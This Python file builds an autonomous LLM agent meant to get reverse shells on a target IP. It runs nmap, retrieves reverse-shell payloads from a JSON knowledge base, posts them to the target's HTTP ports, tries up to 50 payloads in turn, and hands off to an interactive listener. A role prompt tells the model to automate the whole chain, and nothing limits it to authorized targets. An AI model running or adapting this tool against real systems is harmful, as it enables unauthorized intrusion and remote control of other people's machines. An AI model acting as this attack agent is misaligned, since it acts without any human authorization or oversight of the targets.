#!/usr/bin/env python3
"""
Revised nmap_to_llm.py with fairlib integration for interactive agentic workflow.
- Prompts user for OS
- Sets up RAG on reverse_shells.json using fairlib
- Uses fairlib SimpleAgent with ReAct planner for interactive chat and automation
- User interacts with the agent via prompts, e.g., "try to get me a reverse shell on the device with IP 10.200.1.41"
- Agent handles IP extraction, nmap running, analysis, and tool execution sequentially
"""

import os
import subprocess
import xml.etree.ElementTree as ET
import ipaddress
import requests
import textwrap
import sys
import shutil
import json
import socket
import threading
import time
import re

from sentence_transformers import SentenceTransformer
import chromadb
from chromadb.utils import embedding_functions

# fairlib imports (following math_demo.ipynb structure)
from dotenv import load_dotenv
from fairlib.modules.mal.huggingface_adapter import HuggingFaceAdapter
from fairlib.core.message import Message
from fairlib import AbstractTool, ToolRegistry, ToolExecutor, WorkingMemory, SimpleReActPlanner, SimpleAgent, RoleDefinition

# Suppress warnings as in demo
os.environ['HF_HUB_DISABLE_PROGRESS_BARS'] = '1'
os.environ['TRANSFORMERS_NO_ADVISORY_WARNINGS'] = '1'
os.environ['TOKENIZERS_PARALLELISM'] = 'false'

# Load HF token
load_dotenv()
token = os.getenv("HUGGING_FACE_HUB_TOKEN")
if not token:
    raise ValueError("HUGGING_FACE_HUB_TOKEN not found in .env file!")

NMAP_ARGS = ["-sV", "-O", "-Pn", "-oX", "-"]  # service/version detection, OS, no ping, output XML to stdout

# Load reverse_shells.json for RAG
REVERSE_SHELLS_FILE = "reverse_shells.json"
with open(REVERSE_SHELLS_FILE, "r") as f:
    reverse_shells = json.load(f)

# Setup RAG (ChromaDB with SentenceTransformer)
embedder = SentenceTransformer("all-MiniLM-L6-v2")
client = chromadb.Client()
collection_name = "reverse_shells_kb"
if collection_name in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name)
collection = client.create_collection(name=collection_name)

# Add documents to collection
documents = []
ids = []
metadatas = []
for idx, section in enumerate(reverse_shells["sections"]):
    doc = section["payload_info"]["example"]
    documents.append(doc)
    ids.append(str(idx))
    metadatas.append({"os": section["OS"]})
collection.add(
    documents=documents,
    embeddings=[embedder.encode(doc).tolist() for doc in documents],
    ids=ids,
    metadatas=metadatas
)

# Tool Definitions (as subclasses of AbstractTool)
class QueryKBTool(AbstractTool):
    name = "query_kb"
    description = "Query the reverse shells knowledge base for relevant payload examples based on OS or service."
    
    def use(self, query: str, top_k: int = 50) -> str:
        results = collection.query(
            query_embeddings=embedder.encode(query).tolist(),
            n_results=top_k
        )
        relevant = []
        for i in range(top_k):
            if results["documents"] and i < len(results["documents"][0]):
                doc = results["documents"][0][i]
                meta = results["metadatas"][0][i]
                relevant.append(f"OS: {meta['os']}, Payload: {doc}")
        return "\n".join(relevant) if relevant else "No relevant payloads found."

class GetAttackerIPTool(AbstractTool):
    name = "get_attacker_ip"
    description = "Get the attacker's local IP address."
    
    def __init__(self, user_os):
        self.user_os = user_os
    
    def use(self) -> str:
        if self.user_os == "MacOS":
            try:
                route_output = subprocess.check_output(["route", "get", "1.1.1.1"]).decode('utf-8')
                iface = None
                for line in route_output.splitlines():
                    if "interface:" in line:
                        iface = line.split(":")[1].strip()
                        break
                if not iface:
                    raise ValueError("Could not find network interface")
                ip = subprocess.check_output(["ipconfig", "getifaddr", iface]).decode('utf-8').strip()
                return ip
            except Exception as e:
                raise RuntimeError(f"Error getting IP on MacOS: {e}")
        elif self.user_os == "Linux":
            try:
                output = subprocess.check_output(["ip", "route", "get", "1.1.1.1"]).decode('utf-8')
                ip_match = re.search(r'src (\S+)', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find source IP")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Linux: {e}")
        elif self.user_os == "Windows":
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8')
                ip_match = re.search(r'IPv4 Address.*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
                if ip_match:
                    return ip_match.group(1)
                raise ValueError("Could not find IPv4 address")
            except Exception as e:
                raise RuntimeError(f"Error getting IP on Windows: {e}")
        else:
            raise ValueError("Unsupported OS")

class GeneratePayloadTool(AbstractTool):
    name = "generate_payload"
    description = "Generate and write a reverse shell payload to 'current_payload.txt'."
    
    def use(self, os_type: str, listener_ip: str, listener_port: int) -> str:
        selected_section = None
        os_name = os_type.lower()
        if 'linux' in os_name or 'unix' in os_name:
            selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS']), None)
        elif 'windows' in os_name:
            selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
        if not selected_section:
            return "No matching payload found for OS."
        payload_template = selected_section['payload_info']['payload_template']
        payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
        with open('current_payload.txt', 'w') as f:
            f.write(payload)
        return f"Payload generated and written to current_payload.txt: {payload}"

class DeployPayloadTool(AbstractTool):
    name = "deploy_payload"
    description = "Deploy the payload via POST to the target."
    
    def use(self, target_ip: str, target_port: int, endpoint: str = '/exploit', payload_file: str = 'current_payload.txt') -> str:
        try:
            with open(payload_file, 'r') as f:
                payload = f.read().strip()
            url = f"http://{target_ip}:{target_port}{endpoint}"
            data = {'payload': payload}
            response = requests.post(url, data=data, timeout=10)
            return f"Deployment response: Status {response.status_code}, Content: {response.text[:200]}..."
        except Exception as e:
            return f"Deployment error: {str(e)}"

class StartListenerTool(AbstractTool):
    name = "start_listener"
    description = "Start a reverse shell listener and hand off interactively."
    
    def use(self, listener_port: int, timeout: int = 60) -> str:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', listener_port))
        server.listen(1)
        server.settimeout(timeout)
        try:
            conn, addr = server.accept()
            print(f"Connection from {addr}. Enter commands (type 'exit' to quit).")
            def interact():
                while True:
                    try:
                        cmd = input("shell> ")
                        if cmd.lower() == 'exit':
                            break
                        conn.send((cmd + '\n').encode())
                        response = conn.recv(4096).decode(errors='ignore')
                        print(response)
                    except Exception:
                        break
            interact_thread = threading.Thread(target=interact)
            interact_thread.start()
            interact_thread.join()
        except socket.timeout:
            return "Timeout: No connection received."
        except Exception as e:
            return f"Listener error: {str(e)}"
        finally:
            server.close()
        return "Listener session ended."

class TryMultiplePayloadsTool(AbstractTool):
    name = "try_multiple_payloads"
    description = "Try up to 50 most likely payloads on the 3 most likely ports until a reverse shell succeeds. Requires nmap summary."
    
    def use(self, os_type: str, listener_ip: str, listener_port: int, target_ip: str, nmap_summary: str, endpoint: str = '/exploit') -> str:
        # Parse ports from nmap_summary string (assuming it's formatted as in RunNmapTool output)
        http_ports = []
        for line in nmap_summary.splitlines():
            match = re.match(r" - (\d+)/tcp open: http", line)
            if match:
                http_ports.append(int(match.group(1)))
        if not http_ports:
            return "No suitable HTTP/HTTPS ports found in nmap summary."
        likely_ports = http_ports[:3]
        
        filtered_sections = [s for s in reverse_shells["sections"] if os_type.lower() in s["OS"].lower()]
        filtered_sections = filtered_sections[:50]
        
        if not filtered_sections:
            return "No payloads found for the OS type."
        
        for port in likely_ports:
            print(f"Trying payloads on port {port}...")
            for idx, section in enumerate(filtered_sections):
                payload_template = section['payload_info']['payload_template']
                payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
                with open('current_payload.txt', 'w') as f:
                    f.write(payload)
                dep_result = DeployPayloadTool().use(target_ip, port, endpoint)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind(('0.0.0.0', listener_port))
                server.listen(1)
                server.settimeout(30)
                try:
                    conn, addr = server.accept()
                    print(f"Success on port {port}, payload {idx+1} from {addr}. Entering interactive shell.")
                    def interact(conn):
                        while True:
                            cmd = input("shell> ")
                            if cmd.lower() == 'exit':
                                break
                            conn.send((cmd + '\n').encode())
                            response = conn.recv(4096).decode(errors='ignore')
                            print(response)
                    interact(conn)
                    conn.close()
                    server.close()
                    return f"Success on port {port}, payload {idx+1}. Deployment: {dep_result}"
                except socket.timeout:
                    server.close()
                    print(f"Port {port}, payload {idx+1} failed. Trying next...")
                except Exception as e:
                    server.close()
                    return f"Error on port {port}, payload {idx+1}: {str(e)}"
        return "All payloads on all ports failed to establish a connection."

class RunNmapTool(AbstractTool):
    name = "run_nmap"
    description = "Run nmap scan on a target IP and return the parsed summary."
    
    def use(self, ip: str) -> str:
        try:
            xml = run_nmap(ip)
            summary = parse_nmap_xml(xml)
            # Format summary as string for agent memory
            host_info = [f"- {a['type']}: {a['addr']}" for a in summary["addresses"]]
            if summary["hostnames"]:
                host_info.append("- hostnames: " + ", ".join(h["name"] for h in summary["hostnames"]))
            if summary["os_guess"]:
                host_info.append(f"- OS guess: {summary['os_guess']['name']} (accuracy {summary['os_guess']['accuracy']})")
            host_info.append(f"- Host state: {summary.get('host_state')}")
            host_block = "Host info:\n" + "\n".join(host_info)

            ports_block_lines = [f" - {p['port']}/{p['proto']} {p['state']}: {p['service'].get('name') or ''} ({p['service'].get('product') or ''} {p['service'].get('version') or ''})" for p in sorted(summary["ports"], key=lambda x: x["port"])]
            ports_block = "Open/filtered ports and services:\n" + ("\n".join(ports_block_lines) if ports_block_lines else " - none found")

            return f"{host_block}\n\n{ports_block}"
        except Exception as e:
            return f"Error running nmap: {str(e)}"

def validate_ip(ip_str: str) -> str:
    try:
        ip = ipaddress.ip_address(ip_str.strip())
        return str(ip)
    except ValueError:
        raise ValueError(f"Invalid IP address: {ip_str}")

def check_prereqs():
    if not shutil.which("nmap"):
        raise EnvironmentError("nmap not found in PATH. Please install nmap and retry.")

def run_nmap(ip: str, extra_args=None, timeout=120) -> str:
    if extra_args is None:
        extra_args = []
    cmd = ["sudo", "nmap"] + NMAP_ARGS + extra_args + [ip]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if proc.returncode != 0 and not proc.stdout:
        raise RuntimeError(f"nmap error (code {proc.returncode}):\n{proc.stderr.strip()}")
    return proc.stdout

def parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    host = root.find("host")
    if host is None:
        return {"hostnames": [], "addresses": [], "ports": [], "os": None, "raw_host_state": None}

    addresses = [{"addr": addr.get("addr"), "type": addr.get("addrtype")} for addr in host.findall("address")]
    hostnames = [{"name": name.get("name"), "type": name.get("type")} for name in host.find("hostnames").findall("hostname")] if host.find("hostnames") else []
    status = host.find("status")
    host_state = status.get("state") if status is not None else None

    ports = []
    ports_node = host.find("ports")
    if ports_node:
        for p in ports_node.findall("port"):
            portid = p.get("portid")
            proto = p.get("protocol")
            state = p.find("state").get("state") if p.find("state") else None
            service_node = p.find("service")
            service = {
                "name": service_node.get("name"),
                "product": service_node.get("product"),
                "version": service_node.get("version"),
                "extrainfo": service_node.get("extrainfo"),
                "conf": service_node.get("conf"),
            } if service_node else {}
            ports.append({"port": int(portid), "proto": proto, "state": state, "service": service})

    os_node = host.find("os")
    os_guess = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")} if os_node and (osmatch := os_node.find("osmatch")) else None

    return {
        "host_state": host_state,
        "addresses": addresses,
        "hostnames": hostnames,
        "ports": ports,
        "os_guess": os_guess,
    }

async def main():
    # Prompt user for OS
    user_os_input = input("Select your OS: 1 for Windows, 2 for Linux, 3 for MacOS: ").strip()
    if user_os_input == "1":
        user_os = "Windows"
    elif user_os_input == "2":
        user_os = "Linux"
    elif user_os_input == "3":
        user_os = "MacOS"
    else:
        print("Unsupported OS. Exiting.")
        sys.exit(1)
    print(f"Selected OS: {user_os}")

    check_prereqs()

    # Load LLM
    llm = HuggingFaceAdapter(model_name="cognitivecomputations/Dolphin3.0-Qwen2.5-3b", auth_token=token)

    # Register tools
    tool_registry = ToolRegistry()
    tool_registry.register_tool(QueryKBTool())
    tool_registry.register_tool(GetAttackerIPTool(user_os))
    tool_registry.register_tool(GeneratePayloadTool())
    tool_registry.register_tool(DeployPayloadTool())
    tool_registry.register_tool(StartListenerTool())
    tool_registry.register_tool(TryMultiplePayloadsTool())
    tool_registry.register_tool(RunNmapTool())

    # Executor
    executor = ToolExecutor(tool_registry)

    # Memory
    memory = WorkingMemory()

    # Planner with role definition
    planner = SimpleReActPlanner(llm, tool_registry)
    planner.prompt_builder.role_definition = RoleDefinition(
        "You are an expert cybersecurity analyst. Your goal is to automate reverse shell acquisition based on user prompts. "
        "First, extract the target IP from the user's message. Then, call run_nmap to scan it and get the summary. "
        "Analyze the nmap results for vulnerabilities (e.g., open HTTP ports, OS). "
        "Use tools: query_kb for payloads, get_attacker_ip for your IP, generate_payload, deploy_payload, start_listener, try_multiple_payloads if needed. "
        "For multi-step tasks, use tools sequentially (e.g., run_nmap -> query_kb -> get_attacker_ip -> generate_payload -> deploy_payload -> start_listener). "
        "Be precise with arguments. Use nmap summary to select ports/OS for payloads. "
        "If multiple attempts needed, use try_multiple_payloads with nmap_summary as arg. "
        "Respond with status updates and final success/failure."
    )

    # Agent
    agent = SimpleAgent(
        llm=llm,
        planner=planner,
        tool_executor=executor,
        memory=memory,
        max_steps=20  # Increased for more complex workflows
    )

    print("Agent ready. Start chatting (type 'exit' to quit).")
    while True:
        user_input = input("You: ").strip()
        if user_input.lower() == 'exit':
            break
        print("Agent thinking...")
        response = await agent.arun(user_input)
        print("Agent:", response)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())